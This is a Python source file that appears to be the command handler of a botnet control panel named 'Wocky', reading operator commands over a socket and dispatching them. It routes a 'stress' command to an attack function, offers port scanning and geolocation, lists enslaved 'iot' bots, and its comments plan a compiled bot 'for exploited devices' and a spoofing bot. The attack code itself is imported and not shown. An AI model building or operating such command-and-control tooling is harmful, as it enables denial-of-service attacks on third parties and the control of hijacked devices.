import os, sys, time

# Files
from ..auth.crud import *
from ..auth.crudFunc import *
from ..Config.main import *
from ..Config.functions import *
from ..banner_system.modify import *

# Commands
from .geo import *
from .portscan import *
from .attack import *
from .chatroom import *
from .admin_handler import *
from .msg import *

"""
help list 
_________________
help
whoami
clear
info
passwd
methods
"""

buffer_length = 1024

def CMDHandler(socket, addr):
    Strings.CurrentUser = ServerUtils.GetCurrentUsername(socket)
    Strings.CurrentIP = ServerUtils.GetCurrentIP(socket)

    # Request for user input 
    socket.send(str("\r[~]════[Wocky]══$ ").encode())
    data = str(socket.recv(buffer_length).decode()).strip().replace("\r\n", "")

    if data != "":
        print(f"Username: {Strings.CurrentUser} | CMD: " + data + " | Time: " + str(utils.CurrentTime()) + "\n") # Debugging / Removing this later


        if data.lower() == "dashboard":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("dashboard")).encode())
        if data.lower() == "help" or data.lower() == "?":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("help")).encode())
        elif data.lower() == "clear" or data.lower() == "cls":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main")).encode())
        elif data.lower() == "whoami":
            socket.send(str(Strings.GetCurrentUsername(socket)).encode())
        elif data.lower() == "info":
            socket.send(str(CrudFunctions.MyStats(Strings.CurrentUser)).encode())
        elif "passwd" in data:
            socket.send(str(CrudFunctions.ChangePW(Strings.CurrentUser, data.split(" ")[1])).encode())
        elif data.lower() == "methods":
            socket.send(str(Strings.MainColors['Clear'] + CustomBannerMaker.CreateMOTD(utils.GetMOTD()) + BannerModify.GetBannerFromFile("main") + BannerModify.GetBannerFromFile("methods")).encode())
        elif "geo" in data:
            geo_command(socket, data.split(" "))
        elif "pscan" in data:
            pScan_command(socket, data.split(" "))
        elif "stress" in data:
            temporary_attack(socket, data.split(" "))
            print(data.split(" "))
        elif "spoof" in data:
            #python bot, finishing this later. when i get my new laptop
            socket.send("Coming soon....\r\n".encode())
        elif "bots" in data:
            #(C) compiled bot for exploited devices
            socket.send("Coming soon....\r\n".encode())
        elif data.lower() == "iot":
            bot_list = Strings.show_all_bots()
            socket.send(f"                     [ BOT LIST ]\r\n{bot_list}\r\n".encode())
        elif data.lower() == "users":
            client_list = Strings.show_all_clients()
            socket.send(f"                     [ CLIENTS LIST ]\r\n{client_list}\r\n".encode())
        elif data.lower() == "chatroom":
            WockyChat(socket, addr)
        elif "msg" in data:
            msg_user(socket, data)
        elif "admin" in data:
            admin_command(socket, addr, data)